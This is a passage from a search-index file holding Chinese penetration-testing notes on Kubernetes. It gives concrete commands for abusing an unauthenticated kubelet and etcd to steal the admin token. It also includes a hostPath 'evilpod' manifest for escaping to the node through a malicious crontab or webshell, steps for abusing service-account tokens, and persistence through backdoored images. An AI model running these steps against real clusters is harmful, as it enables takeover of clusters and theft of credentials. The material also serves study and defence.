\u91cd\u542fkubelet\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5b9e\u73b0kubelet\u672a\u6388\u6743\u8bbf\u95ee \u5173\u4e8eauthorization-mode\u8fd8\u6709\u4ee5\u4e0b\u7684\u914d\u7f6e --authorization-mode=ABAC \u57fa\u4e8e\u5c5e\u6027\u7684\u8bbf\u95ee\u63a7\u5236\uff08ABAC\uff09\u6a21\u5f0f\u5141\u8bb8\u4f60 \u4f7f\u7528\u672c\u5730\u6587\u4ef6\u914d\u7f6e\u7b56\u7565\u3002 --authorization-mode=RBAC \u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236\uff08RBAC\uff09\u6a21\u5f0f\u5141\u8bb8\u4f60\u4f7f\u7528 Kubernetes API \u521b\u5efa\u548c\u5b58\u50a8\u7b56\u7565\u3002 --authorization-mode=Webhook WebHook \u662f\u4e00\u79cd HTTP \u56de\u8c03\u6a21\u5f0f\uff0c\u5141\u8bb8\u4f60\u4f7f\u7528\u8fdc\u7a0b REST \u7aef\u70b9\u7ba1\u7406\u9274\u6743\u3002 --authorization-mode=Node \u8282\u70b9\u9274\u6743\u662f\u4e00\u79cd\u7279\u6b8a\u7528\u9014\u7684\u9274\u6743\u6a21\u5f0f\uff0c\u4e13\u95e8\u5bf9 kubelet \u53d1\u51fa\u7684 API \u8bf7\u6c42\u6267\u884c\u9274\u6743\u3002 --authorization-mode=AlwaysDeny \u8be5\u6807\u5fd7\u963b\u6b62\u6240\u6709\u8bf7\u6c42\u3002\u4ec5\u5c06\u6b64\u6807\u5fd7\u7528\u4e8e\u6d4b\u8bd5\u3002 --authorization-mode=AlwaysAllow \u6b64\u6807\u5fd7\u5141\u8bb8\u6240\u6709\u8bf7\u6c42\u3002\u4ec5\u5728\u4f60\u4e0d\u9700\u8981 API \u8bf7\u6c42 \u7684\u9274\u6743\u65f6\u624d\u4f7f\u7528\u6b64\u6807\u5fd7\u3002 \u5728\u6211\u4eec\u53d1\u73b0kubelet\u672a\u6388\u6743\u540e\uff0c\u53ef\u4ee5\u8fdb\u884c\u4ee5\u4e0b\u64cd\u4f5c\u62ff\u5230\u5165\u53e3\u70b9 ** \u6267\u884cPod\u5185\u547d\u4ee4**\u200b \u5982\u679c\u6709kubelet\u672a\u6388\u6743\uff0c\u90a3\u5c31\u53ef\u4ee5\u7528\u4ee5\u4e0b\u547d\u4ee4\u5728Pod\u5185\u6267\u884c\u547d\u4ee4 curl -XPOST -k https://node_ip:10250/run/<namespace>/<PodName>/<containerName> -d \"cmd=command\" \u5176\u4e2d\u7684\u53c2\u6570\u53ef\u4ee5\u4ecehttps\\://node_ip:10250/pods \u4e2d\u83b7\u53d6 \u53ef\u4ee5\u76f4\u63a5\u56de\u663e\u547d\u4ee4\u7ed3\u679c\uff0c\u5f88\u65b9\u4fbf ** \u83b7\u53d6\u5bb9\u5668\u5185service account\u51ed\u636e**\u200b \u5982\u679c\u80fd\u5728Pod\u5185\u6267\u884c\u547d\u4ee4\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u83b7\u53d6Pod\u91ccservice account\u7684\u51ed\u636e\uff0c\u4f7f\u7528Pod\u4e0a\u7684service account\u51ed\u636e\u53ef\u4ee5\u7528\u6765\u6a21\u62dfPod\u4e0a\u7684\u670d\u52a1\u8d26\u6237\u8fdb\u884c\u64cd\u4f5c\uff0c\u5177\u4f53\u5229\u7528\u65b9\u6cd5\u89c1\u4e0b\u9762\u7684\u5c0f\u8282\u3002","title":"kubelet \u672a\u6388\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#etcd","text":"etcd\u662fk8s\u96c6\u7fa4\u4e2d\u7684\u6570\u636e\u5e93\u7ec4\u4ef6\uff0c\u9ed8\u8ba4\u76d1\u542c\u57282379\u7aef\u53e3\uff0c\u5982\u679c2379\u5b58\u5728\u672a\u6388\u6743\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7etcd\u67e5\u8be2\u96c6\u7fa4\u5185\u7ba1\u7406\u5458\u7684token\uff0c\u7136\u540e\u7528\u8fd9\u4e2atoken\u8bbf\u95eeapi server\u63a5\u7ba1\u96c6\u7fa4\u3002 etcd\u6709v2\u548cv3\u4e24\u4e2a\u7248\u672c\uff0ck8s\u7528\u7684\u662fv3\u7248\u672c\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u8bbf\u95eeetcd\u7684\u65f6\u5019\u9700\u8981\u7528\u547d\u4ee4ETCDCTL_API=3\u6765\u6307\u5b9aetcd\u7248\u672c\u3002 \u6211\u4eec\u60f3\u8981\u5229\u7528etcd\u672a\u6388\u6743\uff0c\u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u5de5\u5177\u53eb\u505aetcdctl\uff0c\u5b83\u662f\u7528\u6765\u7ba1\u7406etcd\u6570\u636e\u5e93\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5728github\u4e0a\u4e0b\u8f7d\u5b83 https://github.com/etcd-io/etcd/releases/ \"\u5728\u542f\u52a8etcd\u65f6\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a --client-cert-auth \u53c2\u6570\u6253\u5f00\u8bc1\u4e66\u6821\u9a8c\uff0c\u5e76\u4e14\u6ca1\u6709\u901a\u8fc7iptables / \u9632\u706b\u5899\u7b49\u5b9e\u65bd\u8bbf\u95ee\u63a7\u5236\uff0cetcd\u7684\u63a5\u53e3\u548c\u6570\u636e\u5c31\u4f1a\u76f4\u63a5\u66b4\u9732\u7ed9\u5916\u90e8\u9ed1\u5ba2\"\u2014\u2014\u7231\u5947\u827a\u5b89\u5168\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3 \u590d\u73b0\u73af\u5883\u6211\u4e5f\u61d2\u5f97\u642d\u4e86\uff0c\u6211\u4eec\u5c31\u5728\u6388\u6743\u60c5\u51b5\u4e0b\u6765\u590d\u73b0\u8fd9\u4e2a\u6d1e\u5427\uff01\uff08 \u9996\u5148\uff0c\u5982\u679c\u6211\u4eec\u5728\u6ca1\u6709\u8bc1\u4e66\u6587\u4ef6\u7684\u524d\u63d0\u4e0b\u76f4\u63a5\u8bbf\u95ee2375\u7aef\u53e3\uff0c\u662f\u8c03\u7528\u4e0d\u4e86etcd\u5e94\u7528\u7684,\u4f1a\u63d0\u793aX509\u8bc1\u4e66\u9519\u8bef\u3002 ETCDCTL_API=3 ./etcdctl --endpoints=https://etcd_ip:2375/ get / --prefix --keys-only \u6211\u4eec\u9700\u8981\u5c06\u4ee5\u4e0b\u6587\u4ef6\u52a0\u5165\u73af\u5883\u53d8\u91cf\u624d\u80fd\u8bbf\u95ee\uff08\u5982\u679c\u6709\u672a\u6388\u6743\uff0c\u90a3\u4e48\u4e0d\u7528\u5e26\u8bc1\u4e66\u90fd\u80fd\u8bbf\u95ee\uff09 export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key ** \u67e5\u8be2\u7ba1\u7406\u5458token**\u200b \u56fe\u7247\u5f15\u7528\u81ea\u7231\u5947\u827a\u5b89\u5168\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3 \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5728etcd\u91cc\u67e5\u8be2\u7ba1\u7406\u5458\u7684token\uff0c\u7136\u540e\u4f7f\u7528\u8be5token\u914d\u5408kubectl\u6307\u4ee4\u63a5\u7ba1\u96c6\u7fa4\u3002 etcdctl --endpoints=https://etcd_ip:2375/ get / --prefix --keys-only | grep /secrets/ \u5982\u679c\u67e5\u8be2\u7ed3\u679c\u6709\u654f\u611f\u8d26\u6237\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u53bb\u83b7\u53d6\u4ed6\u7684token etdctl --endpoints=https://etcd_ip:2375/ get /registry/secrets/default/admin-token-55712 \u62ff\u5230token\u4ee5\u540e\uff0c\u7528kubectl\u63a5\u7ba1\u96c6\u7fa4 kubectl --insecure-skip-tls-verify -s https://master_ip:6443/ --token=\"xxxxxx\" get nodes","title":"etcd \u672a\u6388\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_7","text":"","title":"\u6267\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_8","text":"\u8fd9\u4e2a\u6280\u672f\u662f\u7efc\u5408\u4e86\u6267\u884c\u3001\u6301\u4e45\u5316\u3001\u6743\u9650\u63d0\u5347\u7684\u4e00\u4e2a\u653b\u51fb\u65b9\u6cd5\uff0c\u4e3a\u4e86\u7701\u4e8b\uff0c\u5c31\u653e\u5728\u8fd9\u91cc\u4e00\u5757\u8bf4\u4e86\u3002 \u9996\u5148\uff0c\u5728\u6211\u4eec\u83b7\u53d6\u4e86api server\u63a7\u5236\u6743\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efaPod\uff0c\u5e76\u5728\u5bb9Pod\u5185\u90e8\u6267\u884c\u547d\u4ee4\u3002\u5982\u679c\u6211\u4eec\u5728\u521b\u5efaPod\u65f6\uff0c\u5c06Node\u8282\u70b9\u7684\u6839\u76ee\u5f55\u6302\u8f7d\u5230Pod\u7684\u67d0\u4e2a\u76ee\u5f55\u4e0b\uff0c\u7531\u4e8e\u6211\u4eec\u80fd\u5728Pod\u5185\u90e8\u6267\u884c\u547d\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u6302\u8f7d\u5230Pod\u4e0b\u7684Node\u8282\u70b9\u6839\u76ee\u5f55\u4e2d\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u5982\u679c\u6211\u4eec\u5199\u5165\u6076\u610fcrontab\u3001web shell\u3001ssh\u516c\u94a5\uff0c\u4fbf\u53ef\u4ee5\u4ecePod\u9003\u9038\u5230\u5bbf\u4e3b\u673aNode\uff0c\u83b7\u53d6Node\u63a7\u5236\u6743\u3002 \u5177\u4f53\u590d\u73b0\u5982\u4e0b \u5148\u521b\u5efa\u4e00\u4e2a\u6076\u610fPod \u9996\u5148\u6211\u4eec\u521b\u5efa\u6076\u610fPod\uff0c\u53ef\u4ee5\u76f4\u63a5\u521b\u5efaPod\uff0c\u4e5f\u53ef\u4ee5\u7528Deployment\u521b\u5efa\u3002 \u65e2\u7136\u63d0\u5230\u521b\u5efaPod\uff0c\u90a3\u4e48\u5c31\u591a\u63d0\u4e00\u53e5\uff1a\u76f4\u63a5\u521b\u5efaPod\u548c\u7528Deployment\u521b\u5efaPod\u7684\u533a\u522b\u662f\u4ec0\u4e48\uff1f Deployment\u53ef\u4ee5\u66f4\u65b9\u4fbf\u7684\u8bbe\u7f6ePod\u7684\u6570\u91cf\uff0c\u65b9\u4fbfPod\u6c34\u5e73\u6269\u5c55\u3002 Deployment\u62e5\u6709\u66f4\u52a0\u7075\u6d3b\u5f3a\u5927\u7684\u5347\u7ea7\u3001\u56de\u6eda\u529f\u80fd,\u5e76\u4e14\u652f\u6301\u6eda\u52a8\u66f4\u65b0\u3002 \u4f7f\u7528Deployment\u5347\u7ea7Pod\u53ea\u9700\u8981\u5b9a\u4e49Pod\u7684\u6700\u7ec8\u72b6\u6001\uff0ck8s\u4f1a\u4e3a\u4f60\u6267\u884c\u5fc5\u8981\u7684\u64cd\u4f5c\u3002 \u5982\u679c\u521b\u5efa\u4e00\u4e2a\u5c0f\u73a9\u610f\uff0c\u90a3\u4e48\u76f4\u63a5\u521b\u5efaPod\u5c31\u884c\u4e86\uff0c\u6ca1\u5fc5\u8981\u7528deployment\u3002 _______________________________________ \u7528Pod\u521b\u5efa apiVersion: v1 kind: Pod metadata: name: evilpod spec: containers: - image: nginx name: container volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / __________________________________ \u7528deployment\u521b\u5efa apiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment labels: app: nginx-test spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - image: nginx name: container volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / \u5c06\u4ee5\u4e0a\u6587\u672c\u5199\u5165\u5230\u4e00\u4e2ayaml\u6587\u4ef6\u4e2d\uff0c\u7136\u540e\u6267\u884c kubectl apply -f xxxxx.yaml \u5982\u679c\u662fapi server\u672a\u6388\u6743\u6253\u8fdb\u53bb\u7684\uff0c\u53ef\u80fd\u8981\u901a\u8fc7-s\u53c2\u6570\u8bbe\u7f6e\u4e00\u4e0bapi server\u7684ip\u548c\u5730\u5740\uff1akubectl -s http://master_ip:8080 command \u8fd9\u91cc\u518d\u591a\u5634\u4e00\u53e5 kubectl apply \u548c kubectl create \u8fd9\u4e24\u4e2a\u547d\u4ee4\u7684\u533a\u522b \u4e24\u4e2a\u547d\u4ee4\u90fd\u53ef\u4ee5\u7528\u4e8e\u521b\u5efapod\uff0capply\u66f4\u503e\u5411\u4e8e\u201d\u7ef4\u62a4\u8d44\u6e90\u201c\uff0c\u53ef\u4ee5\u7528\u4e8e\u66f4\u65b0\u5df2\u6709Pod\uff1b\u800ccreate\u66f4\u503e\u5411\u4e8e\u201d\u76f4\u63a5\u521b\u5efa\u201c\uff0c\u4e0d\u7ba1\u4e09\u4e03\u4e8c\u5341\u4e00\u7ed9\u6211\u521b\u5efa\u5c31\u5b8c\u4e8b\u4e86 \u7b80\u800c\u8a00\u4e4b\uff0c\u5f53\u4e00\u4e2a\u8d44\u6e90\u5df2\u7ecf\u5b58\u5728\u65f6\uff0c\u7528create\u4f1a\u62a5\u9519\uff0c\u800capply\u4e0d\u4f1a\u62a5\u9519 \u2014\u2014\u2014\u2014\u2014\u2014ref:https://stackoverflow.com/questions/47369351/kubectl-apply-vs-kubectl-create \u6076\u610f\u5bb9\u5668\u5c31\u521b\u5efa\u597d\u4e86 \u521b\u5efa\u597d\u4e86\u540e\u4f7f\u7528\u547d\u4ee4 kubectl get pods \u83b7\u53d6\u6076\u610fpod\u7684\u540d\u5b57 \u7136\u540e\u4f7f\u7528\u547d\u4ee4 kubectl exec -it evilpodname /bin/bash \u8fdb\u5165pod\u5185\u90e8shell\uff0c\u7136\u540e\u5411\u6302\u8f7d\u5230Pod\u5185\u90e8\u7684Node\u6839\u76ee\u5f55\u4e2d\u5199\u5165\u6076\u610fcrontab\u3001ssh\u516c\u94a5\u3001webshell\u5373\u53ef\u62ff\u5230node\u7684shell\u3002 \u5927\u81f4\u6d41\u7a0b\u4e00\u5f20\u56fe\u8868\u793a\u5982\u4e0b","title":"*\u76ee\u5f55\u6302\u8f7d\u9003\u9038"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#service-accountapi-server","text":"k8s\u6709\u4e24\u79cd\u8d26\u6237\uff1a\u7528\u6237\u8d26\u6237\u548c\u670d\u52a1\u8d26\u6237\uff0c\u7528\u6237\u8d26\u6237\u88ab\u7528\u4e8e\u4eba\u4e0e\u96c6\u7fa4\u4ea4\u4e92\uff08\u5982\u7ba1\u7406\u5458\u7ba1\u7406\u96c6\u7fa4\uff09\uff0c\u670d\u52a1\u8d26\u6237\u7528\u4e8ePod\u4e0e\u96c6\u7fa4\u4ea4\u4e92\uff08\u5982Pod\u8c03\u7528api server\u63d0\u4f9b\u7684\u4e00\u4e9bAPI\u8fdb\u884c\u4e00\u4e9b\u6d3b\u52a8\uff09 \u5982\u679c\u6211\u4eec\u5165\u4fb5\u4e86\u4e00\u53f0\u6709\u7740\u9ad8\u6743\u9650\u670d\u52a1\u8d26\u6237\u7684Pod\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u7528\u5b83\u5bf9\u5e94\u7684\u670d\u52a1\u8d26\u6237\u8eab\u4efd\u8c03\u7528api server\u5411\u96c6\u7fa4\u4e0b\u8fbe\u547d\u4ee4\u3002 pod\u7684serviceaccount\u4fe1\u606f\u4e00\u822c\u5b58\u653e\u4e8e/var/run/secrets/kubernetes.io/serviceaccount/\u76ee\u5f55\u4e0b \u4f46\u662f\u9ed8\u8ba4\u7684user\u6216\u8005service account\u5e76\u4e0d\u5177\u5907\u4efb\u4f55\u6743\u9650 \u8fd9\u662f\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2apod\u4f7f\u7528\u81ea\u8eabservice account(\u9ed8\u8ba4\u4e3a\u5f53\u524d\u547d\u540d\u7a7a\u95f4\u7684default\u8d26\u6237)\u53bb\u8bf7\u6c42api server\u8fd4\u56de\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u53d1\u73b0\u662f\u6ca1\u6709\u6743\u9650\u7684\u3002 $ CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt $ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) $ NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace) $ curl --cacert $CA_CERT -H \"Authorization: Bearer $TOKEN\" \"https://192.168.111.20:6443/version/\" \"kind\": \"Status\", \"apiVersion\": \"v1\", \"metadata\": {}, \"status\": \"Failure\", \"message\": \"version is forbidden: User \\\"system:serviceaccount:default:default\\\" cannot list resource \\\"version\\\" in API group \\\"\\\" at the cluster scope\", \"reason\": \"Forbidden\", \"details\": { \"kind\": \"version\" }, \"code\": 403 \u90a3\u4e48\u6211\u73b0\u5728\u521b\u5efa\u4e00\u4e2a\u9ad8\u6743\u9650service account \u5e76\u4f7f\u5176\u4e0e\u4e00\u4e2aPod\u76f8\u5173\u8054\uff0c\u6765\u590d\u73b0\u4e00\u4e0b\u8fd9\u4e2a\u653b\u51fb\u624b\u6cd5 \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u9ad8\u6743\u9650service account kubectl create serviceaccount niubi #\u521b\u5efaservice account\uff1aniubi kubectl create clusterrolebinding cluster-admin-niubi --clusterrole=cluster-admin --serviceaccount=default:niubi #\u628aniubi\u653e\u5165\u96c6\u7fa4\u7ba1\u7406\u5458\u7ec4\uff0c\u76f8\u5f53\u4e8e\u7ed9\u4e86\u5b83\u9ad8\u6743\u9650 \u7136\u540e\u5c06service account\u4e0epod\u76f8\u5173\u8054 \u5728\u521b\u5efaPod\u7684yaml\u6587\u4ef6\u4e2d\u7684spec\u9879\u4e2d\u8f93\u5165 serviceAccountName: niubi \u518d\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u53ef\u4ee5\u8c03\u7528api server\u4e86","title":"\u5229\u7528Service Account\u8fde\u63a5API Server\u6267\u884c\u6307\u4ee4"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_9","text":"\u8fd9\u91cc\u7684\u6301\u4e45\u5316\u662f\u6307\u5982\u4f55\u5728Pod\u4e2d\u6301\u4e45\u5316\u3001\u5982\u4f55\u5728Node\u4e2d\u6301\u4e45\u5316\u3001\u5982\u4f55\u5728\u96c6\u7fa4\u4e2d\u6301\u4e45\u5316\u3002 \u5982\u4f55\u5728Node\u4e2d\u6301\u4e45\u5316\uff0c\u5728\u4e0a\u4e00\u5c0f\u8282\u4e2d\u5df2\u7ecf\u63d0\u5230\u8fc7\u4e00\u4e9b\uff1a\u901a\u8fc7\u5199\u5165crontab\uff0cssh\u516c\u94a5\uff0cwebshell\u5b9e\u73b0\uff0c\u4f46\u4e2a\u4eba\u89c9\u5f97\u8fd9\u51e0\u4e2a\u624b\u6bb5\u4e0e\u5176\u8bf4\u662f\u6301\u4e45\u5316\uff0c\u4e0d\u5982\u8bf4\u662f\u6743\u9650\u63d0\u5347\u66f4\u7b26\u5408\u5b9e\u9645\u4e00\u70b9\uff0c\u56e0\u4e3a\u8fd9\u51e0\u4e2a\u624b\u6bb5\u5728\u5b9e\u9645\u6e17\u900f\u4e2d\u90fd\u662f\u4e3a\u4e86\u4ecePod\u9003\u9038\u51fa\u6765\u83b7\u53d6Node\u6743\u9650\u3002 \u540c\u65f6\uff0c\u5728Pod\uff0cNode\uff0cMaster\u4e0a\u505a\u6301\u4e45\u5316\uff0c\u6709\u5927\u90e8\u5206\u65b9\u6cd5\u672c\u8d28\u4e0a\u662f\u201c\u5982\u4f55\u5728linux\u673a\u5668\u4e0a\u505a\u6301\u4e45\u5316\u201d\uff0c\u800c\u201c\u5982\u4f55\u5728linux\u673a\u5668\u4e0a\u505a\u6301\u4e45\u5316\u201d\u65b9\u6cd5\u5c31\u592a\u591a\u4e86\uff0c\u8fd9\u91cc\u5c31\u53ea\u7740\u91cd\u4e8e\u8bb2\u8ff0\u5728\u201c\u4e91\u73af\u5883\u201d\u91cc\u72ec\u6709\u7684\u6301\u4e45\u5316\u65b9\u6cd5\u3002 ** \u5728\u79c1\u6709\u955c\u50cf\u5e93\u4e2d\u690d\u5165\u540e\u95e8\uff08Pod\u6301\u4e45\u5316\uff09** \u200b \u5982\u679c\u63a5\u7ba1\u4e86\u5bf9\u65b9\u7684\u79c1\u6709\u955c\u50cf\u5e93\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5728\u5176\u5bf9\u8c61Dockerfile\u4e2d\u585e\u5165\u6076\u610f\u6307\u4ee4\uff08\u53cd\u5f39shell\u7b49\uff09 \u6216\u8005\u7f16\u8f91\u955c\u50cf\u7684\u6587\u4ef6\u5c42\u4ee3\u7801\uff0c\u5c06\u955c\u50cf\u4e2d\u539f\u59cb\u7684\u53ef\u6267\u884c\u6587\u4ef6\u6216\u94fe\u63a5\u5e93\u6587\u4ef6\u66ff\u6362\u4e3a\u7cbe\u5fc3\u6784\u9020\u7684\u540e\u95e8\u6587\u4ef6\u4e4b\u540e\u518d\u6b21\u6253\u5305\u6210\u65b0\u7684\u955c\u50cf\u3002 ** \u4fee\u6539\u6838\u5fc3\u7ec4\u4ef6\u8bbf\u95ee\u6743\u9650\uff08\u96c6\u7fa4\u6301\u4e45\u5316\uff09** \u200b \u5305\u62ec\u4e14\u4e0d\u9650\u4e8e \u66f4\u6539\u914d\u7f6e\u66b4\u9732apiserver 8080\u7aef\u53e3\u3001\u66b4\u9732docker.sock\u3001\u66b4\u9732\u672a\u6388\u6743etcd\u3001\u66b4\u9732\u672a\u6388\u6743kubelet\u7b49\u4fee\u6539\u96c6\u7fa4\u914d\u7f6e\u6587\u4ef6\u8fbe\u5230\u6301\u4e45\u5316\u7684\u65b9\u6cd5\u3002 ** shadow api server\uff08\u96c6\u7fa4\u6301\u4e45\u5316/cdk\u5de5\u5177\u5229\u7528\uff09** \u200b \u90e8\u7f72\u4e00\u4e2a\u989d\u5916\u7684\u672a\u6388\u6743\u4e14\u4e0d\u8bb0\u5f55\u65e5\u5fd7\u7684api server\u4ee5\u4f9b\u6211\u4eec\u8fdb\u884c\u6301\u4e45\u5316\u3002 \u6211\u4eec\u53ef\u4ee5\u7528github\u4e0a\u4e13\u95e8\u7528\u4e8ek8s\u6e17\u900f\u7684\u5de5\u5177cdk\uff08\u8fd9\u4e2a\u5de5\u5177\u5f88\u5c4c\uff09\u6765\u505a\u5230\u8fd9\u4e00\u70b9 https://github.com/cdk-team/CDK/wiki/CDK-Home-CN https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver","title":"\u6301\u4e45\u5316"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_10","text":"\u6307\u4ecepod\u62ff\u5230Node\u7684shell\uff0c\u6216\u8005\u62ff\u5230\u96c6\u7fa4\u63a7\u5236\u6743\u3002 \u4e0a\u9762\u7684\u5c0f\u8282\u63d0\u5230\u8fc7\u4e00\u4e9b\uff0c\u6bd4\u5982kubectl\u672a\u6388\u6743\u3001docker.sock\u3001\u6302\u8f7d\u76ee\u5f55\u3001\u9ad8\u6743\u9650Service account\u7b49\u65b9\u6cd5\u3002 \u9664\u6b64\u4e4b\u5916\u8fd8\u6709Docker\u3001k8s\u7684\u4e00\u4e9bCVE Docker\u9003\u9038\u5982CVE-2019-5736\uff0cCVE-2019-14271,CVE-2020-15257 k8s\u63d0\u6743\u5230\u63a5\u7ba1\u96c6\u7fa4\u7684\u5982CVE-2018-1002105,CVE-2020-8558","title":"\u6743\u9650\u63d0\u5347"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_11","text":"","title":"\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_12","text":"\u6839\u76ee\u5f55\u4e0b/.dockerenv \u6587\u4ef6\u5b58\u5728\u5373docker\u73af\u5883 /proc/1/cgroup \u5185\u82e5\u5305\u542bdocker\u6216kube\u5b57\u7b26\u4e32\u5219\u662f\u5728docker\u73af\u5883\u6216k8s pod \u4e4b\u4e2d \u6ca1\u6709\u5e38\u89c1\u547d\u4ee4 \u67e5\u770b\u73af\u5883\u53d8\u91cf\u4e2d\u662f\u5426\u6709k8s\u6216\u8005docker\u5b57\u7b26\u4e32 \u67e5\u770b\u7aef\u53e3\u5f00\u653e\u60c5\u51b5\uff08netstat -anp\uff09\uff0c\u5982\u679c\u5f00\u653e\u4e86\u4e00\u4e9b\u7279\u6b8a\u7aef\u53e3\u59826443\u30018080\uff08api server\uff09,2379\uff08etcd\uff09,10250\u300110255\uff08kubelet\uff09\uff0c10256\uff08kube-proxy\uff09 \u90a3\u4e48\u53ef\u4ee5\u521d\u6b65\u5224\u5b9a\u4e3a\u662f\u5728k8s\u73af\u5883\u4e2d\u7684\u4e00\u53f0Node\u6216\u8005master\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4ea6\u53ef\u7528\u4e8e\u7aef\u53e3\u626b\u63cf\u63a2\u6d4b\u76ee\u6807\u4e3b\u673a\u662f\u5426\u4e3ak8s\u96c6\u7fa4\u4e2d\u7684\u673a\u5668 \u67e5\u770b\u5f53\u524d\u7f51\u6bb5\uff0ck8s\u4e2d Flannel\u7f51\u7edc\u63d2\u4ef6\u9ed8\u8ba4\u4f7f\u752810.244.0.0/16\u7f51\u7edc\uff0cCalico\u9ed8\u8ba4\u4f7f\u7528192.168.0.0/16\u7f51\u7edc\uff0c\u5982\u679c\u51fa\u73b0\u5728\u8fd9\u4e9b\u7f51\u6bb5\u4e2d\uff08\u7279\u522b\u662f10.244\u7f51\u6bb5\uff09\u90a3\u4e48\u53ef\u4ee5\u521d\u6b65\u5224\u65ad\u4e3a\u96c6\u7fa4\u4e2d\u7684\u4e00\u4e2apod\u3002pod\u91cc\u9762\u547d\u4ee4\u5f88\u5c11\uff0c\u53ef\u4ee5\u901a\u8fc7hostname -I(\u5927\u5199i)\u6765\u67e5\u770bip\u5730\u5740","title":"\u662f\u5426\u5728\u5bb9\u5668\u73af\u5883\u4e2d"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#ref","text":"https://developer.aliyun.com/article/765449#slide-5 https://xz.aliyun.com/t/4276#toc-4 https://tttang.com/archive/1389/ https://payloads.online/archivers/2021-07-20/1/ https://www.freebuf.com/articles/database/316788.html https://www.freebuf.com/vuls/196993.html https://github.com/pen4uin/cloud-native-security https://www.updateweb.cn/zwfec/item-367.html https://kuboard.cn/learning/ (\u975e\u5e38\u597d\u7684\u4e2d\u6587\u6559\u7a0b) https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/ (k8s\u5b98\u65b9\u6559\u7a0b\uff0c\u6709\u4ea4\u4e92\u5f0f\u64cd\u4f5c\u754c\u9762\uff0c\u7a0d\u5fae\u6709\u70b9\u4e0d\u597d\u7684\u662f\u6709\u4e9b\u5730\u65b9\u6ca1\u6709\u4e2d\u6587) \u5173\u4e8e\u8282\u70b9\u7684\u4e00\u822c\u6027\u4fe1\u606f\uff0c\u4f8b\u5982\u5185\u6838\u7248\u672c\u3001Kubernetes \u7248\u672c\uff08kubelet \u548c kube-proxy \u7248\u672c\uff09\u3001 Docker 